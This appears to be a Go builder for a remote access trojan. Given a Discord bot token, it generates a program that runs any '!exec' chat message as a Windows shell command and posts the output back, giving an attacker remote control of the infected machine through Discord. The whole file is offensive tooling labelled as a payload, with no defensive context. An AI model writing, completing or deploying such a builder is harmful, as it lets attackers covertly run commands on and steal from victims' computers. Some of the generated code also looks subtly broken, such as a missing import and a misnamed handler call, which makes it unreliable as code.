package main

import (
	"flag"
	"fmt"
	"os"
	"strings"
	"text/template"
)

func main() {
	// Define flags for the bot token and output filename
	botToken := flag.String("token", "", "Discord bot token")
	outputFile := flag.String("w", "", "Output Go file name to generate")

	// Parse the command line flags
	flag.Parse()

	// Validate the inputs
	if *botToken == "" || *outputFile == "" {
		fmt.Println("Error: Bot token and output file name are required.")
		return
	}

	// Define the template for the bot's Go code
	payloadTemplate := `
package main

import (
	"fmt"
	"os/exec"
	"github.com/bwmarrin/discordgo"
)

func main() {
	// Replace with your bot token
	token := "{{.Token}}"

	// Create a new Discord session using the provided bot token
	dg, err := discordgo.New("Bot " + token)
	if err != nil {
		fmt.Println("error creating Discord session,", err)
		return
	}

	// Register the messageCreate function as a callback for message events
	dg.AddMessageCreate(messageCreate)

	// Open a websocket connection to Discord and begin listening
	err = dg.Open()
	if err != nil {
		fmt.Println("error opening connection,", err)
		return
	}

	fmt.Println("Bot is now running. Press CTRL+C to exit.")
	select {}
}

// This function will be called whenever a message is created
func messageCreate(s *discordgo.Session, m *discordgo.MessageCreate) {
	if m.Author.ID == s.State.User.ID {
		return
	}

	// Only execute commands if the message starts with !exec
	if strings.HasPrefix(m.Content, "!exec") {
		// Get the command part from the message (after the !exec prefix)
		cmdStr := strings.TrimPrefix(m.Content, "!exec ")

		// Execute the command
		cmd := exec.Command("cmd", "/C", cmdStr)
		out, err := cmd.CombinedOutput()

		// If there's an error, send it back to Discord
		if err != nil {
			s.ChannelMessageSend(m.ChannelID, "Error executing command: "+err.Error())
		} else {
			s.ChannelMessageSend(m.ChannelID, "Output: \n"+string(out))
		}
	}
}
`

	// Create or overwrite the output file
	file, err := os.Create(*outputFile)
	if err != nil {
		fmt.Println("Error creating output file:", err)
		return
	}
	defer file.Close()

	// Create a new template and parse the payload template
	tmpl, err := template.New("payload").Parse(payloadTemplate)
	if err != nil {
		fmt.Println("Error parsing template:", err)
		return
	}

	// Execute the template and write to the output file
	err = tmpl.Execute(file, struct{ Token string }{*botToken})
	if err != nil {
		fmt.Println("Error executing template:", err)
		return
	}

	fmt.Printf("Payload successfully generated and written to %s\n", *outputFile)
}
